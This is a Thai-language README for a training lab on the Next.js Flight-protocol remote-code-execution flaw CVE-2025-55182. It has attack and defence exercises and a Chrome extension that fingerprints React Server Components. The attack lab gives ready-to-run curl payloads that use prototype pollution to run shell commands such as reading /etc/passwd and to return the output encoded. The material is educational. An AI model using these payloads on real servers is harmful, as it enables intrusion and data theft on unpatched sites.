# 🎮 How to Play — CVE-2025-55182 Playground

## 📁 โครงสร้าง Repository

```
Project/
├── LAB-RCE-ATTACK/     # 🔴 ฝึกโจมตี — ส่ง RCE Exploit ไปยังระบบเป้าหมาย
├── LAB-RCE-DEFENSE/    # 🛡️ ฝึกรับมือ — แก้ไขช่องโหว่ในฐานะ Sysadmin
├── RSC_Detector/       # 🔍 Chrome Extension — ตรวจจับเว็บที่ใช้ RSC
└── Documents/          # 📄 เอกสารอธิบายเชิงลึก
```

---

## LAB-RCE-ATTACK

### Description

 Lab นี้จำลองสภาพแวดล้อมของ **Next.js 15.0.4** ที่รันในโหมด Production (Standalone) ซึ่งมีช่องโหว่ **CVE-2025-55182 (React2Shell)** อยู่ภายใน

ช่องโหว่เกิดจาก Flight Deserializer ใน Next.js ไม่กรอง Reference Path ที่ประกอบด้วย `__proto__` และ `constructor` ออก ทำให้ผู้โจมตีสามารถ:

1. **Pollute Prototype** — ฉีด `.then` เข้าสู่ `Object.prototype` ผ่าน path `$1:__proto__:then`
2. **Access Function Constructor** — ใช้ `$1:constructor:constructor` เพื่อเข้าถึง `Function` ของ JavaScript
3. **Execute Arbitrary Code** — รันโค้ดใด ๆ บน Server ผ่าน `child_process.execSync()`
4. **Exfiltrate Data** — ดึงผลลัพธ์คำสั่งออกมาในรูป Base64 ผ่าน Error `digest` field

> **ผู้เล่นจะได้เรียนรู้:** วิธีสร้างและส่ง Exploit Payload, การวิเคราะห์ Flight Wire Format, และการถอดรหัสผลลัพธ์จาก Server

**เป้าหมาย:** ส่ง RCE Exploit ผ่าน React Flight Protocol ไปยัง Next.js 15.0.4 และดึงข้อมูลจาก Server

### สิ่งที่ต้องมี

- Docker
- `curl` หรือ Postman
- `base64` decoder (built-in ใน Linux/macOS หรือใช้ https://www.base64decode.org)

### ขั้นตอน

#### 1. Build & Run Container

```bash
cd LAB-RCE-ATTACK
docker build -t lab-rce-attack .
docker run -d --name rce-attack -p 3000:3000 lab-rce-attack
```

ตรวจสอบว่า Server ขึ้นแล้ว:

```bash
curl http://localhost:3000
```

#### 2. ตรวจสอบ RSC Fingerprint

ส่ง Request พร้อม Header `RSC: 1` เพื่อยืนยันว่า Server ใช้ React Server Components:

```bash
curl -si http://localhost:3000 -H "RSC: 1" | grep -i "content-type"
# ผลลัพธ์ที่คาดหวัง: Content-Type: text/x-component
```

#### 3. ส่ง Exploit Payload

แทนที่ `COMMAND_HERE` ด้วยคำสั่งที่ต้องการรัน เช่น `id`, `cat /etc/passwd`, `ls /`

```bash
curl -s http://localhost:3000 \
  -H "Next-Action: x" \
  -F '0={"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require(\"child_process\").execSync(\"COMMAND_HERE\").toString(\"base64\");throw Object.assign(new Error(\"x\"),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
```

#### 4. ถอดรหัสผลลัพธ์

Response จะมี field `digest` ที่เป็น Base64 ของผลลัพธ์คำสั่ง:

```bash
# ตัวอย่าง Response:
# {"digest":"aWQK..."}

# ถอดรหัส:
echo "BASE64_STRING_HERE" | base64 -d
```

#### 5. ตัวอย่าง Exploit แบบสมบูรณ์ (อ่าน /etc/passwd)

```bash
curl -s http://localhost:3000 \
  -H "Next-Action: x" \
  -F '0={"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require(\"child_process\").execSync(\"cat /etc/passwd\").toString(\"base64\");throw Object.assign(new Error(\"x\"),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}' \
  | python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d.get('digest','')).decode())"
```

#### ทำความสะอาด

```bash
docker stop rce-attack && docker rm rce-attack
```

---

## LAB-RCE-DEFENSE

### Description

Lab นี้จำลองสถานการณ์ที่คุณเป็น **System Administrator** ที่ได้รับแจ้งว่าเซิร์ฟเวอร์ Next.js ของบริษัทมีช่องโหว่ RCE และกำลังถูกโจมตีอยู่ คุณต้องเข้าสู่ระบบผ่าน SSH และแก้ไขช่องโหว่ให้สำเร็จก่อนที่ข้อมูลจะรั่วไหล

Container นี้รัน **Next.js 15.0.4 ในโหมด Development** พร้อม Server Action ที่เป็นเป้าหมาย ระบบมี Secret (`RNG_SECRET`) ซ่อนอยู่เป็น Environment Variable — ถ้าช่องโหว่ยังไม่ได้รับการแก้ไข ผู้โจมตีจะสามารถขโมยค่านี้ได้

โปรแกรม `submit` จะจำลองการโจมตีจริงเพื่อตรวจสอบว่าช่องโหว่ถูกปิดแล้วหรือยัง:

| ขั้นตอนการตรวจสอบ | รายละเอียด |
|---|---|
| **[1/3]** ตรวจ Version | ตรวจสอบ Next.js version ที่ติดตั้ง |
| **[2/3]** ตรวจ Server | ตรวจว่า Dev Server รันอยู่บน port 3000 |
| **[3/3]** ส่ง Payload | ส่ง RCE Payload พยายามขโมย `RNG_SECRET` |

> **ผู้เล่นจะได้เรียนรู้:** การ Patch ช่องโหว่โดยการอัปเกรด Dependency, การจัดการ Process ด้วย tmux, และการยืนยันผลการแก้ไขด้วย Automated Test

**เป้าหมาย:** เข้าสู่ระบบผ่าน SSH และแก้ไขช่องโหว่ RCE ใน Next.js 15.0.4 ให้สำเร็จ จากนั้นรัน `submit` เพื่อรับ Flag

### สิ่งที่ต้องมี

- Docker
- SSH Client (`ssh` command หรือ PuTTY บน Windows)

### ข้อมูล Container

| รายการ | ค่า |
|---|---|
| **SSH Port** | `2222` |
| **App Port** | `3000` |
| **Username** | `secspace` |
| **Password** | `secspace` |
| **App Path** | `/home/secspace/app` |
| **Next.js** | `15.0.4` (มีช่องโหว่) |

### ขั้นตอน

#### 1. Build & Run Container

```bash
cd LAB-RCE-DEFENSE
docker build -t lab-rce-defense .
docker run -d --name rce-defense -p 2222:22 -p 3000:3000 lab-rce-defense
```

#### 2. SSH เข้าสู่ระบบ

```bash
ssh secspace@localhost -p 2222
# Password: secspace
```

#### 3. ตรวจสอบสถานะเริ่มต้น (ควรล้มเหลว — ยังมีช่องโหว่)

```bash
submit
# ผลลัพธ์ที่คาดหวัง: 🔴 VERIFICATION FAILED
```

#### 4. แก้ไขช่องโหว่ — อัปเกรด Next.js

```bash
cd ~/app
npm install next@latest
```

หรือใช้ codemod อัตโนมัติ:

```bash
cd ~/app
npx @next/codemod@latest upgrade
```

#### 5. รีสตาร์ท Dev Server

```bash
# ใช้ helper script ที่เตรียมไว้:
restart-app

# หรือทำ manual:
tmux kill-session -t nextjs
cd ~/app
export RNG_SECRET=$(cat .rng_secret)
tmux new-session -d -s nextjs "export RNG_SECRET=$(cat /home/secspace/app/.rng_secret) && npm run dev"
```

#### 6. ยืนยันการแก้ไขและรับ Flag

```bash
submit
# ผลลัพธ์ที่คาดหวัง: 🟢 VERIFICATION PASSED
# Flag: cve{nextjs-flight-protocol-issue-defended}
```

#### ทำความสะอาด

```bash
docker stop rce-defense && docker rm rce-defense
```

---

## 🔍 RSC_Detector (Chrome Extension)

### Description

เครื่องมือ Chrome Extension สำหรับ **Reconnaissance** ขั้นแรกก่อนการทดสอบช่องโหว่ มีประโยชน์สำหรับทั้ง Penetration Tester และ Security Researcher ที่ต้องการระบุว่าเว็บไซต์เป้าหมายใช้ React Server Components หรือไม่

Extension ทำงาน 2 โหมด:
- **Passive** — สแกน HTML Source และ Response Headers ของทุกหน้าที่เปิดโดยอัตโนมัติ ไม่ส่ง Request พิเศษใด ๆ
- **Active** — ส่ง HTTP Request พร้อม Header `RSC: 1` ไปยัง URL ปัจจุบัน เพื่อดูว่า Server ตอบสนองด้วย `text/x-component` หรือไม่

> **ผู้เล่นจะได้เรียนรู้:** วิธีระบุ RSC Fingerprint บนเว็บไซต์จริง และทำความเข้าใจ Detection Logic ของช่องโหว่นี้

**เป้าหมาย:** ติดตั้ง Extension สำหรับสแกนหาเว็บไซต์ที่ใช้ React Server Components (RSC) และอาจมีช่องโหว่ Flight Protocol

### การติดตั้ง

1. เปิด Chrome แล้วไปที่ `chrome://extensions/`
2. เปิด **Developer mode** (สวิตช์มุมบนขวา)
3. คลิก **"Load unpacked"**
4. เลือก Folder `RSC_Detector/`

### วิธีใช้งาน

| โหมด | วิธีใช้ | สิ่งที่ตรวจจับ |
|---|---|---|
| **Passive** | เปิดเว็บไซต์ตามปกติ | Extension สแกนอัตโนมัติ |
| **Active** | คลิก Icon → กด "Start Fingerprint Probe" | ส่ง Request พร้อม Header `RSC: 1` |

### สัญญาณที่ Extension ตรวจจับ

- `Content-Type: text/x-component` — Response จาก RSC Endpoint
- `window.__next_f` — Global variable ของ Next.js App Router
- `react-server-dom-webpack` — Reference ใน HTML Source
- `Vary: RSC` — Header ที่ Next.js ใส่ไว้

### การทดสอบกับ Lab

1. เปิด `http://localhost:3000` (ขณะที่ LAB-RCE-ATTACK หรือ LAB-RCE-DEFENSE รันอยู่)
2. คลิก Icon ของ RSC_Detector
3. กด **"Start Fingerprint Probe"**
4. ดูผลลัพธ์ — ควรตรวจพบ RSC Fingerprint

---

## สรุปภาพรวม

```
ขั้นตอนการเรียนรู้แนะนำ:

[1] อ่าน Documents/main.pdf      — เข้าใจทฤษฎี Flight Protocol
       ↓
[2] ติดตั้ง RSC_Detector          — ฝึกตรวจจับเป้าหมาย
       ↓
[3] เล่น LAB-RCE-ATTACK           — ฝึกส่ง Exploit และทำความเข้าใจกลไก
       ↓
[4] เล่น LAB-RCE-DEFENSE          — ฝึกแก้ไขช่องโหว่ในฐานะ Defender
```

---

> 📖 สำหรับรายละเอียดเชิงลึกเพิ่มเติม ดูได้ที่ [Documents/main.tex](Documents/main.tex)
